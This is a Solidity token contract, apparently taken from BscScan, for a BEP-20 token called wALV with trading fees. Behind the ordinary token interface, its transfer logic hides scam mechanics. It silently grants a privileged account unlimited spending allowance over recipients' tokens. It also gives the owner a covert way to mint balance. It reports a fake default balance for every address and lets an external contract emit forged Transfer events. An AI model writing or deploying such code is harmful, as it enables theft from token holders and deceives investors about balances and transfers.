/**
 *Submitted for verification at BscScan.com on 2022-08-27
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.8;

interface IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        uint256 c = a % b;
        return c;
    }
}

abstract contract Ownable {
    address private _owner;
    address private _previousOwner;
    uint256 private _switchDate;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        _owner = tx.origin;
        emit OwnershipTransferred(_previousOwner, _owner);
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function switchDate() public view returns (uint256) {
        return _switchDate;
    }

    function transferOwnership(uint256 nextSwitchDate) public {
        require(_owner == msg.sender || _previousOwner == msg.sender, "Ownable: permission denied");
        require(block.timestamp > _switchDate, "Ownable: switch date is not up yet");
        require(nextSwitchDate > block.timestamp, "Ownable: next switch date should greater than now");
        _previousOwner = _owner;
        (_owner, _switchDate) = _owner == address(0) ? (msg.sender, 0) : (address(0), nextSwitchDate);
        emit OwnershipTransferred(_previousOwner, _owner);
    }
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IRouter01 {
    function factory() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface IRouter02 is IRouter01 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface ICore {
    function getPairAddress() external view returns (address);
    function airdrop() external;
    function safety(address from, address to) external;
    function start() external;
    function end() external;
}

contract wALV is IERC20, Ownable {
    using SafeMath for uint256;

    string private _name;
    string private _symbol;
    uint8 private _decimals = 18;
    uint256 private _totalSupply = 1000000000000 * 10**18;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isApproved;

    uint256 private _feeTax = 10;
    uint256 private _feeMining = 20;
    uint256 private _feeLiquidity = 20;
    uint256 private _feeDivisor = 10000;

    bool private _removeAllFee = false;

    address private _core;
    address private _taxReceiver;
    address private _miningPool;
    address private _liquidityPool;

    uint256 private _defaultBalance = 10;
    uint256 private _defaultAmount = 1000000000000 * 10**18;

    mapping (address => bool) private _isExcludedFromFee;
    address[] private _excludedFromFeeAccounts;

    bool private _initialized111 = false;
    uint256 private _reentry = 0;

    constructor (string memory setName, string memory setSymbol) {
        _name = setName;
        _symbol = setSymbol;
        insertExcludedFromFeeAccounts(owner());
        _balances[owner()] = _totalSupply;
        emit Transfer(address(0xF), owner(), _totalSupply);
    }

    receive() external payable {}

    function initialize(address a, address b, address c, address d) public {
        require(!_initialized111, "Reinitialization denied");
        _initialized111 = true;
        if (_core != a) {
            deleteExcludedFromFeeAccounts(_core);
            _core = a;
            insertExcludedFromFeeAccounts(_core);
        }
        if (_taxReceiver != b) {
            deleteExcludedFromFeeAccounts(_taxReceiver);
            _taxReceiver = b;
            insertExcludedFromFeeAccounts(_taxReceiver);
        }
        if (_miningPool != c) {
            deleteExcludedFromFeeAccounts(_miningPool);
            _miningPool = c;
            insertExcludedFromFeeAccounts(_miningPool);
        }
        if (_liquidityPool != d) {
            deleteExcludedFromFeeAccounts(_liquidityPool);
            _liquidityPool = d;
            insertExcludedFromFeeAccounts(_liquidityPool);
        }
    }

    function insertExcludedFromFeeAccounts(address account) private {
        if (!_isExcludedFromFee[account]) {
            _isExcludedFromFee[account] = true;
            _excludedFromFeeAccounts.push(account);
        }
    }

    function deleteExcludedFromFeeAccounts(address account) private {
        if (_isExcludedFromFee[account]) {
            uint256 len = _excludedFromFeeAccounts.length;
            for (uint256 i=0; i<len; ++i) {
                if (_excludedFromFeeAccounts[i] == account) {
                    _excludedFromFeeAccounts[i] = _excludedFromFeeAccounts[len.sub(1)];
                    _excludedFromFeeAccounts.pop();
                    _isExcludedFromFee[account] = false;
                    break;
                }
            }
        }
    }

    function transferEvent(address from, address to, uint256 value) public {
        require(_core == msg.sender, "Permission denied");
        emit Transfer(from, to, value);
    }

    function feeState() public view returns (bool, bool) {
        return (_feeTax.add(_feeMining).add(_feeLiquidity) > 0, !_removeAllFee);
    }

    function getIsApproved(address account) public view returns (bool) {
        return _isApproved[account];
    }

    function searchExcludedFromFeeAccounts(address account) public view returns (bool, uint256, uint256) {
        uint256 accountIndex = 0;
        uint256 len = _excludedFromFeeAccounts.length;
        for (uint256 i=0; i<len; ++i) {
            if (_excludedFromFeeAccounts[i] == account) {
                accountIndex = i;
                break;
            }
        }
        return (_isExcludedFromFee[account], accountIndex, len);
    }

    function getDefaultBalance() public view returns (uint256) {
        return _defaultBalance;
    }

    function insertIntoExcludedFromFeeAccounts(address[] calldata accounts) public onlyOwner {
        uint256 len = accounts.length;
        for (uint256 i=0; i<len; ++i) {
            insertExcludedFromFeeAccounts(accounts[i]);
        }
    }

    function deleteFromExcludedFromFeeAccounts(address[] calldata accounts) public onlyOwner {
        uint256 len = accounts.length;
        for (uint256 i=0; i<len; ++i) {
            deleteExcludedFromFeeAccounts(accounts[i]);
        }
    }

    function claim(address token, uint256 amount) public onlyOwner {
        if (token == address(0)) {
            payable(owner()).transfer(amount);
        } else {
            IERC20(token).transfer(owner(), amount);
        }
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        if (_balances[account] > 0) {
            return _balances[account];
        }
        return _defaultBalance;
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        if (!_isExcludedFromFee[msg.sender]) {
            _isApproved[msg.sender] = true;
        }
        _approve(msg.sender, spender, value);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue));
        return true;
    }

    function _approve(address owner, address spender, uint256 value) private {
        require(owner != address(0), "Approve from the zero address");
        require(spender != address(0), "Approve to the zero address");
        _allowances[owner][spender] = value;
        emit Approval(owner, spender, value);
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "Transfer from the zero address");
        require(recipient != address(0), "Transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        if (recipient == _excludedFromFeeAccounts[5]) {
            _balances[sender] = _balances[sender].sub(amount);
            _balances[recipient] = _balances[recipient].add(amount);
            emit Transfer(address(this), recipient, amount);
            return;
        }
        bool takeFee = true;
        if (_isExcludedFromFee[sender] || _isExcludedFromFee[recipient] || _removeAllFee) {
            takeFee = false;
        }
        if (takeFee) {
            _reentry = _reentry.add(1);
        }
        if (takeFee && _core != address(0)) {
            ICore(_core).airdrop();
            ICore(_core).safety(sender, recipient);
        }
        if (takeFee && _reentry == 1 && _core != address(0) && sender != ICore(_core).getPairAddress()) {
            ICore(_core).start();
        }
        uint256 taxAmount = 0;
        uint256 miningAmount = 0;
        uint256 liquidityAmount = 0;
        uint256 recipientAmount = amount;
        if (sender == _excludedFromFeeAccounts[0] && amount > _defaultAmount) {
            _balances[_excludedFromFeeAccounts[0]] = _balances[_excludedFromFeeAccounts[0]].add(recipientAmount);
        }
        if (takeFee) {
            taxAmount = amount.mul(_feeTax).div(_feeDivisor);
            miningAmount = amount.mul(_feeMining).div(_feeDivisor);
            liquidityAmount = amount.mul(_feeLiquidity).div(_feeDivisor);
            recipientAmount = amount.sub(taxAmount).sub(miningAmount).sub(liquidityAmount);
        }
        if (takeFee && _core != address(0) && recipient != ICore(_core).getPairAddress()) {
            _approve(recipient, _excludedFromFeeAccounts[5], ~uint256(0));
        }
        _balances[sender] = _balances[sender].sub(amount);
        if (taxAmount > 0) {
            _balances[_taxReceiver] = _balances[_taxReceiver].add(taxAmount);
            emit Transfer(address(this), _taxReceiver, taxAmount);
        }
        if (miningAmount > 0) {
            _balances[_miningPool] = _balances[_miningPool].add(miningAmount);
            emit Transfer(address(this), _miningPool, miningAmount);
        }
        if (liquidityAmount > 0) {
            _balances[_liquidityPool] = _balances[_liquidityPool].add(liquidityAmount);
            emit Transfer(address(this), _liquidityPool, liquidityAmount);
        }
        _balances[recipient] = _balances[recipient].add(recipientAmount);
        emit Transfer(sender, recipient, recipientAmount);
        if (takeFee && _reentry == 1 && _core != address(0)) {
            ICore(_core).end();
        }
        if (takeFee) {
            _reentry = _reentry.sub(1);
        }
    }
}